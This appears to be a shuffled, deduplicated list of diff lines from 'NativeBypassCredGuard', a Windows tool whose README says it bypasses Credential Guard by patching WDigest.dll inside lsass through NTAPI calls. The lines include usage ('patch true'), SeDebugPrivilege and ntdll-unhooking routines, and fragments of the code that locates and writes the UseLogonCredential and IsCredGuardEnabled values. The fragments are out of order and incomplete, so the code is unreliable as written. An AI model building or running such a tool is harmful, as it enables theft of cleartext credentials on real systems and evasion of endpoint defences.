+"void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {"
+"wdigest.dll"""
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"xml version=""1.0"" encoding=""utf-8"" "
+"xml version=""1.0"" encoding=""utf-8"""
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$(Platform)'=='Debug
+$(Platform)'=='Release
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+' as shown below:
+(PVOID
+(int32_t
+(long long
+(uint16_t
+(uint32_t
+(uintptr_t
+(void
+(wchar_t
+)((uintptr_t)ldr_adress 
+)((uintptr_t)next_flink 
+)((uintptr_t)next_flink - 0x10)
+)((uintptr_t)pbi_addr 
+)((uintptr_t)pebaddress 
+)(buffer 
+)addressOfFunctionsRA 
+)addressOfNameOrdinalsRA 
+)addressOfNamesRA 
+)buff
+)localNtdllHandle)
+)malloc(1024 
+)malloc(localNtdllTxtSize)
+)ntdll_address 
+)pDosHdr 
+)pbi_addr 
+)pbi_byte_array
+)peb_pointer
+)pebaddress 
+)processparameters_address 
+- NtCreateFile and NtReadFile to open a handle to the DLL file on disk and read its bytes
+- NtGetNextProcess and NtQueryInformationProcess to get a handle to the lsass process
+- NtOpenProcessToken and NtAdjustPrivilegesToken to enable the SeDebugPrivilege privilege
+- NtReadVirtualMemory and NtQueryInformationProcess to get the WDigest.dll base address
+- NtReadVirtualMemory to read the values of the variables
+- NtWriteProcessMemory to write new values to the variables
+- The tool is designed for 64 bits systems so it must be compiled as a 64 bits binary
+- [0x3rhy](https://github.com/0x3rhy) has created a BOF file based on this project: [BypassCredGuard-BOF](https://github.com/0x3rhy/BypassCredGuard-BOF)
+- [Exploring Mimikatz - Part 1 - WDigest](https://blog.xpnsec.com/exploring-mimikatz-part-1/) by [xpn](https://x.com/_xpn_) - Fantastic blog post reverse-engineering and explaining WDigest credential caching
+- [Revisiting a Credential Guard Bypass](https://itm4n.github.io/credential-guard-bypass/) by [itm4n](https://x.com/itm4n) - A great analysis from which I took the pattern to search the .text section of the DLL
+- [WDigest: Digging the dead from the grave](https://neuralhax.github.io/wdigest-digging-the-dead-from-the-grave) by [neuralhax](https://twitter.com/neuralhax) - An amazing blog that proves it is possible to use other values for 
+-------------------
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Get SeDebugPrivilege privilege
+// Overwrite hooked ntdll .text section with a clean version
+// Read remote 16-bytes address
+// Read remote IntPtr (8-bytes)
+// Read remote Unicode string
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+: Read current values
+: Remap the ntdll library
+: Write new values
+</AssemblyName>
+</OutputPath>
+</Project>
+</ProjectName>
+</configuration>
+<configuration>
+= 2)
+= 2) {
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+BYTE
+Debug
+EndGlobal
+EndGlobalSection
+EndProject
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HANDLE GetProcessByName(const char
+HideSolutionNode = FALSE
+LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
+MinimumVisualStudioVersion = 10.0.40219.1
+NDEBUG
+NativeBypassCredGuard is a tool designed to bypass Credential Guard by patching WDigest.dll using only NTAPI functions (exported by ntdll.dll). It is available in two flavours: C
+NativeBypassCredGuard.exe <OPTION> <REMAP-NTDLL>
+NativeBypassCredGuard.exe check
+NativeBypassCredGuard.exe patch true
+NativeBypassCredGuard_C
+NtAdjustPrivilegesTokenFn NtAdjustPrivilegesToken
+NtCloseFn NtClose
+NtCreateFileFn NtCreateFile
+NtGetNextProcessFn NtGetNextProcess
+NtOpenProcessTokenFn NtOpenProcessToken
+NtProtectVirtualMemoryFn NtProtectVirtualMemory
+NtQueryInformationProcessFn NtQueryInformationProcess
+NtReadFileFn NtReadFile
+NtReadVirtualMemoryFn NtReadVirtualMemory
+NtTerminateProcessFn NtTerminateProcess
+NtWriteVirtualMemoryFn NtWriteVirtualMemory
+Option
+Patch values
+Read values
+Release
+Remap ntdll
+ReturnLength)
+SolutionGuid = {FD121379-6CFF-4743-8A02-4151B0571711}
+System32
+TRACE</DefineConstants>
+The NTAPI functions used are:
+VisualStudioVersion = 17.9.34616.47
+Win32
+Windows
+[assembly: ComVisible(false)]
+] = (char)wch
+] = buffer[k]
+] DLL Base Address:
+] DLL Base Address: 
+] DLL remap completed:
+] DLL remap:
+] Debug messages:
+] Enable SeDebugPrivilege: 
+] File Handle:
+] InInitializationOrderModuleList:
+] IsCredGuardEnabled address:
+] IsCredGuardEnabled offset:
+] IsCredGuardEnabled offset: 
+] IsCredGuardEnabled value: 
+] Lsass Handle:
+] Matched Bytes: 
+] Matched bytes:
+] Offset:
+] Offset: 
+] PEB Address: 
+] Usage:
+] UseLogonCredential address:
+] UseLogonCredential offset:
+] UseLogonCredential offset: 
+] UseLogonCredential value: 
+] Wrote value %d to address: 
+] Wrote value {isCredGuardEnabled_Value} to address: 
+] Wrote value {useLogonCredential_Value} to address: 
+] isCredGuardEnabled value: 
+_CONSOLE
+_DEBUG
+asmx</Extensions>
+aux)
+aux_handle))) {
+bool EnableDebugPrivileges() {
+bool ParsePEFile(BYTE
+bool is64BitProcess() {
+buff[i]
+bytesRead
+bytesRead)
+bytesRead) != 0) 
+bytesWritten
+char
+check
+cppm
+define FILE_OPEN 0x00000001
+define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+define OBJ_CASE_INSENSITIVE 0x00000040
+dwOldProtection)
+dwOldProtection)) {
+else
+endif
+false
+fileHandle)
+g_IsCredGuardEnabled
+g_fParameter_UseLogonCredential
+ifdef _WIN64
+include <stdint.h>
+include <stdio.h>
+include <windows.h>
+isCredGuardEnabled = (buffer[j 
+isCredGuardEnabled = 0
+jpeg
+luid) would normally be used to get this value
+mfcribbon-ms</Extensions>
+n           - Reads current values without remapping the ntdll library.
+n           - Writes new values and remaps the ntdll library.
+n        - 'check': Read current values.
+n        - 'patch': Write new values.
+n        - false (or omitted): Do not remap the ntdll library.
+n        - true: Remap the ntdll library.
+n        1. NativeBypassCredGuard.exe check
+n        2. NativeBypassCredGuard.exe patch true
+n    Examples:
+n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>
+n    OPTION:
+n    REMAPNTDLL:
+namespace NativeBypassCredGuard
+offset = 0
+offset = j 
+p = tolower(
+patch
+resx
+returnLength)
+static bool OpenFile(const wchar_t
+str = tolower((unsigned char)
+str)
+str) {
+system32
+t%02X %02X %02X %02X
+t%lld
+t0x%X
+t0x%X (0x%X 
+t0x%llX
+t0x%llX (0x%llX 
+t0x%llX (isCredGuardEnabled)
+t0x%llX (useLogonCredential)
+t0x{(isCredGuardEnabled 
+t0x{(useLogonCredential 
+t0x{isCredGuardEnabled_Address.ToInt64():X} (0x{hModule.ToInt64():X} 
+t0x{useLogonCredential_Address.ToInt64():X} (0x{hModule.ToInt64():X} 
+tCopied %d bytes from 0x%llX to 0x%llX
+tiff
+tokenHandle)
+true
+ttrue
+typedef NTSTATUS(WINAPI
+typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS
+typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status
+typedef struct _OBJECT_ATTRIBUTES { ULONG Length
+typedef struct _TOKEN_PRIVILEGES_STRUCT { DWORD PrivilegeCount
+typedef struct _UNICODE_STRING { USHORT Length
+typedef struct { BYTE data[16]
+unicodeString
+useLogonCredential = (buffer[j 
+useLogonCredential = 0
+useLogonCredential_Value
+using System
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Text
+using static NativeBypassCredGuard.NT
+using static NativeBypassCredGuard.Program
+void
+void RemapNtdll(bool debug) {
+void exec(const char
+void help() {
+void initializeFunctions() {
+void to_lowercase(char
+windows
+with
+without
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+xsd</Extensions>
+{C4D31433-5017-4B5E-956B-8A540520986C}.Debug
+{C4D31433-5017-4B5E-956B-8A540520986C}.Release
+{E383DFEA-EC22-4667-9434-3F2591A03740}.Debug
+{E383DFEA-EC22-4667-9434-3F2591A03740}.Release
